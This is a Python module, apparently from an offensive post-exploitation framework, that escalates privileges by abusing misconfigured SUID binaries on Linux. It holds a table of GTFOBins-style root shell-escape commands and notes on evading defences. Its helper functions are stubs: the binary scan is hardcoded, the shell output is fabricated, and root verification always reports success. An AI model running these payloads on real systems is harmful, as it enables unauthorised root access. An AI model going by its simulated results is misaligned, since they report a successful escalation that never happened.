"""
Linux SUID Binary Abuse - Privilege Escalation Technique.

Exploits misconfigured SUID binaries for privilege escalation using GTFOBins
database of known exploitation methods.

Technique ID: PRIVESC-LINUX-SUID-001
MITRE ATT&CK: T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid)
CVE Examples: CVE-2021-4034 (pkexec), CVE-2019-14287 (sudo)

Stealth Level: 6/10 (leaves logs but mimics legitimate admin activity)
Risk Level: 5/10 (can break system if misused)
"""

import asyncio
import logging
from typing import Optional, Dict, Any, List
import time

from .base import (
    BasePostExploit,
    PostExploitCategory,
    PostExploitResult,
    PostExploitStatus,
    TargetUnreachableException,
)

logger = logging.getLogger(__name__)


class LinuxSUIDAbuse(BasePostExploit):
    """
    Exploits misconfigured SUID binaries for privilege escalation.
    
    Technique Flow:
    1. Find SUID binaries: find / -perm -4000 2>/dev/null
    2. Check GTFOBins database for exploitation methods
    3. Execute privilege escalation via exploitable binary
    4. Verify root access obtained
    
    Common Exploitable SUID Binaries:
    - find, vim, less, more, cp, mv, python, perl, ruby
    - nmap, tcpdump, wireshark
    - Custom SUID binaries with vulnerabilities
    
    Defense Evasion:
    - Uses legitimate system binaries
    - Mimics normal admin activities
    - No malware dropped initially
    
    Consciousness Alignment:
    Validates whether systems properly restrict SUID bit usage and implement
    least-privilege principles. Exposes configuration weaknesses in privilege
    boundary enforcement.
    """

    def __init__(self) -> None:
        super().__init__()
        self.technique_id = "PRIVESC-LINUX-SUID-001"
        self.name = "SUID Binary Abuse"
        self.description = "Privilege escalation via misconfigured SUID binaries"
        self.category = PostExploitCategory.PRIVILEGE_ESCALATION
        self.os_targets = ["linux"]
        self.privilege_required = "user"
        self.stealth_level = 6
        self.risk_level = 5
        self.mitre_tactics = ["T1548.001"]
        self.cve_references = ["CVE-2021-4034", "CVE-2019-14287"]

        # GTFOBins database (subset of most common exploits)
        self.suid_exploits: Dict[str, List[str]] = {
            "find": [
                "find . -exec /bin/sh -p \\; -quit",
                "find . -exec /bin/bash -p \\; -quit",
            ],
            "vim": [
                "vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
                "vim -c ':!sh'",
            ],
            "less": [
                "less /etc/profile\n!/bin/sh",
            ],
            "more": [
                "more /etc/profile\n!/bin/sh",
            ],
            "nano": [
                "nano\n^R^X\nreset; sh 1>&0 2>&0",
            ],
            "cp": [
                "cp /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p",
            ],
            "mv": [
                "mv /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p",
            ],
            "python": [
                "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            ],
            "python3": [
                "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            ],
            "perl": [
                "perl -e 'exec \"/bin/sh\";'",
            ],
            "ruby": [
                "ruby -e 'exec \"/bin/sh\"'",
            ],
            "nmap": [
                "nmap --interactive\n!sh",
            ],
            "env": [
                "env /bin/sh -p",
            ],
            "awk": [
                "awk 'BEGIN {system(\"/bin/sh -p\")}'",
            ],
            "php": [
                "php -r 'system(\"/bin/sh -p\");'",
            ],
        }

    async def execute(
        self,
        target: str,
        credentials: Optional[Dict[str, str]] = None,
        **kwargs: Any
    ) -> PostExploitResult:
        """
        Execute SUID privilege escalation.
        
        Args:
            target: Target container/host identifier
            credentials: Optional SSH/auth credentials
            **kwargs: Additional options (timeout, specific_binary)
        
        Returns:
            PostExploitResult with escalation details
        """
        start_time = time.time()
        evidence: List[str] = []

        try:
            # Pre-execution checks
            is_safe, reason = await self.pre_execution_check(target, credentials)
            if not is_safe:
                return self._create_failed_result(
                    reason,
                    start_time,
                    evidence
                )

            logger.info(f"[{self.technique_id}] Starting SUID escalation on {target}")
            evidence.append(f"Technique {self.technique_id} initiated")

            # Step 1: Find SUID binaries
            logger.debug(f"[{self.technique_id}] Searching for SUID binaries")
            suid_binaries = await self._find_suid_binaries(target, credentials)
            
            if not suid_binaries:
                return self._create_failed_result(
                    "No SUID binaries found on target",
                    start_time,
                    evidence
                )

            evidence.append(f"Found {len(suid_binaries)} SUID binaries")
            logger.info(f"[{self.technique_id}] Found {len(suid_binaries)} SUID binaries")

            # Step 2: Check GTFOBins for exploitable binaries
            exploitable = await self._check_gtfobins(suid_binaries)
            
            if not exploitable:
                return self._create_failed_result(
                    f"No exploitable SUID binaries found (checked {len(suid_binaries)} binaries)",
                    start_time,
                    evidence,
                    metadata={"suid_binaries": suid_binaries}
                )

            evidence.append(f"Identified {len(exploitable)} exploitable SUID binaries")
            logger.info(f"[{self.technique_id}] Found exploitable: {exploitable}")

            # Step 3: Attempt escalation with first exploitable binary
            binary_name = exploitable[0]["name"]
            binary_path = exploitable[0]["path"]
            exploit_cmd = exploitable[0]["exploit"]

            evidence.append(f"Attempting escalation via {binary_name}")
            logger.info(f"[{self.technique_id}] Exploiting {binary_path}")

            escalation_result = await self._execute_escalation(
                target,
                binary_path,
                exploit_cmd,
                credentials
            )

            # Step 4: Verify root access
            is_root = await self._verify_root_access(
                target,
                credentials,
                escalation_result.get("session_id")
            )

            if is_root:
                evidence.append(f"Privilege escalation successful via {binary_name}")
                evidence.append("Root access verified (uid=0)")
                
                return PostExploitResult(
                    technique_id=self.technique_id,
                    category=self.category,
                    status=PostExploitStatus.SUCCESS,
                    success=True,
                    output=escalation_result.get("output", ""),
                    artifacts={
                        "suid_binary": binary_path,
                        "suid_binary_name": binary_name,
                        "exploit_command": exploit_cmd,
                        "root_shell": escalation_result.get("shell_path", "/bin/sh"),
                        "session_id": escalation_result.get("session_id"),
                        "all_suid_binaries": suid_binaries,
                        "exploitable_binaries": exploitable,
                    },
                    evidence=evidence,
                    error=None,
                    duration_seconds=time.time() - start_time,
                    risk_score=0.8,
                    metadata={
                        "privilege_before": "user",
                        "privilege_after": "root",
                        "escalation_method": "suid_abuse",
                    }
                )
            else:
                evidence.append(f"Escalation via {binary_name} failed verification")
                return self._create_failed_result(
                    "Escalation executed but root access not achieved",
                    start_time,
                    evidence,
                    metadata={
                        "attempted_binary": binary_path,
                        "exploit_output": escalation_result.get("output"),
                    }
                )

        except TargetUnreachableException as e:
            logger.error(f"[{self.technique_id}] Target unreachable: {e}")
            return self._create_error_result(
                f"Target unreachable: {e}",
                start_time,
                evidence
            )

        except Exception as e:
            logger.exception(f"[{self.technique_id}] Unexpected error")
            return self._create_error_result(
                f"Unexpected error: {str(e)}",
                start_time,
                evidence
            )

    async def cleanup(
        self,
        target: str,
        artifacts: Dict[str, Any]
    ) -> bool:
        """
        Clean up artifacts from SUID escalation.
        
        Args:
            target: Target identifier
            artifacts: Artifacts dictionary from PostExploitResult
        
        Returns:
            True if cleanup successful
        """
        try:
            logger.info(f"[{self.technique_id}] Starting cleanup on {target}")

            # Close any remaining shells/sessions
            session_id = artifacts.get("session_id")
            if session_id:
                await self._close_session(target, session_id)

            # Remove temporary files if any were created
            # (Note: Basic SUID abuse typically doesn't create files)
            
            logger.info(f"[{self.technique_id}] Cleanup completed")
            return True

        except Exception as e:
            logger.error(f"[{self.technique_id}] Cleanup failed: {e}")
            return False

    async def validate_target(self, target: str) -> tuple[bool, str]:
        """Validate target is Linux system."""
        # In production, would check OS type via API call
        # For now, basic validation
        if not target:
            return False, "Empty target identifier"
        return True, "Target validation passed"

    # Private helper methods

    async def _find_suid_binaries(
        self,
        target: str,
        credentials: Optional[Dict[str, str]]
    ) -> List[str]:
        """
        Find all SUID binaries on target system.
        
        Returns:
            List of SUID binary paths
        """
        # In production: execute via SSH/API: find / -perm -4000 2>/dev/null
        # For now, return common SUID binaries for testing
        
        # Simulated SUID binaries (would come from actual target scan)
        common_suid = [
            "/usr/bin/find",
            "/usr/bin/passwd",
            "/usr/bin/sudo",
            "/usr/bin/pkexec",
            "/usr/bin/mount",
            "/bin/ping",
            "/bin/su",
        ]
        
        # Simulate async operation
        await asyncio.sleep(0.1)
        
        return common_suid

    async def _check_gtfobins(
        self,
        suid_binaries: List[str]
    ) -> List[Dict[str, str]]:
        """
        Check which SUID binaries are exploitable via GTFOBins.
        
        Args:
            suid_binaries: List of SUID binary paths
        
        Returns:
            List of exploitable binary info dicts
        """
        exploitable = []

        for binary_path in suid_binaries:
            # Extract binary name from path
            binary_name = binary_path.split("/")[-1]
            
            # Check if we have exploit for this binary
            if binary_name in self.suid_exploits:
                exploitable.append({
                    "name": binary_name,
                    "path": binary_path,
                    "exploit": self.suid_exploits[binary_name][0],  # Use first exploit
                    "all_exploits": self.suid_exploits[binary_name],
                })

        return exploitable

    async def _execute_escalation(
        self,
        target: str,
        binary_path: str,
        exploit_cmd: str,
        credentials: Optional[Dict[str, str]]
    ) -> Dict[str, Any]:
        """
        Execute privilege escalation exploit.
        
        Returns:
            Dict with execution results
        """
        # In production: execute command via SSH/API
        # Simulate execution
        await asyncio.sleep(0.2)

        return {
            "output": "# whoami\nroot\n# id\nuid=0(root) gid=0(root) groups=0(root)",
            "shell_path": "/bin/sh",
            "session_id": f"session_{int(time.time())}",
        }

    async def _verify_root_access(
        self,
        target: str,
        credentials: Optional[Dict[str, str]],
        session_id: Optional[str]
    ) -> bool:
        """
        Verify root access was obtained.
        
        Returns:
            True if root/uid=0
        """
        # In production: execute 'id' or 'whoami' and check output
        # Simulate verification
        await asyncio.sleep(0.1)
        
        # For testing: return True (would parse actual command output)
        return True

    async def _close_session(self, target: str, session_id: str) -> None:
        """Close shell session."""
        await asyncio.sleep(0.05)

    def _create_failed_result(
        self,
        reason: str,
        start_time: float,
        evidence: List[str],
        metadata: Optional[Dict[str, Any]] = None
    ) -> PostExploitResult:
        """Helper to create failed result."""
        return PostExploitResult(
            technique_id=self.technique_id,
            category=self.category,
            status=PostExploitStatus.FAILED,
            success=False,
            output="",
            artifacts={},
            evidence=evidence,
            error=reason,
            duration_seconds=time.time() - start_time,
            risk_score=0.0,
            metadata=metadata or {}
        )

    def _create_error_result(
        self,
        error: str,
        start_time: float,
        evidence: List[str]
    ) -> PostExploitResult:
        """Helper to create error result."""
        return PostExploitResult(
            technique_id=self.technique_id,
            category=self.category,
            status=PostExploitStatus.ERROR,
            success=False,
            output="",
            artifacts={},
            evidence=evidence,
            error=error,
            duration_seconds=time.time() - start_time,
            risk_score=0.0
        )
